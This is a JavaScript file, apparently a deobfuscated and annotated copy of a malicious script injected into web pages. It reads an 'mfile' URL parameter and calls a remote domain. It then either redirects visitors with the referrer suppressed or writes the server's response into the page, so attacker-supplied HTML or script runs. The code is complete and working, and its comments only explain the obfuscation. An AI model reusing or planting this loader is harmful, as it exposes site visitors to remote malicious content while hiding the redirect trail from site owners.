var redirectWithoutReferrer, params, id;

(function () {
  // Helper aliases (just to obfuscate)
  function getRedirect() { return redirectWithoutReferrer; }
  function getJSON() { return JSON; }
  function getConsole() { return console; }
  function getWindow() { return window; }
  function getDocument() { return document; }
  function getString() { return String; }

  // The big scrambled string is decoded into this array:
  const strings = [
    "meta",                                    // [0]
    "referrer",                                // [1]
    "no-referrer",                             // [2]
    "mfile",                      // [3]
    "get",                                     // [4]
    "https://www.google.com",                  // [5]
    "https://nst.hktogel.online/apps/apifolder/api.php?id="  // [6]
  ];

  // Creates a <meta name="referrer" content="no-referrer"> and injects it into <head>
  redirectWithoutReferrer = function (url) {
    const meta = document.createElement(strings[0]); // "meta"
    meta.name = strings[1];                          // "referrer"
    meta.content = strings[2];                       // "no-referrer"
    document.head.appendChild(meta);
    window.location.replace(url);
  };

  // Only run once
  if (!window.__mfile_FETCH_RAN__) {
    window.__mfile_FETCH_RAN__ = 1;

    params = new URLSearchParams(window.location.search);
    id = params[strings[4]](strings[3]);  // params.get("mfile")

    if (!id) {
      // No ID → redirect to Google (with no-referrer)
      redirectWithoutReferrer(strings[5]);
    } else {
      // Fetch from the tracker domain
      fetch(strings[6] + encodeURIComponent(id))
        .then(res => res.text())
        .then(body => {
          try {
            const data = JSON.parse(body);
            if (data.redirectUrl) {
              redirectWithoutReferrer(data.redirectUrl);
              return;
            }
          } catch (e) {}
          // If not a redirect JSON, just dump the response into the page
          document.open();
          document.write(body);
          document.close();
        })
        .catch(err => console.error(err));
    }
  }
})();
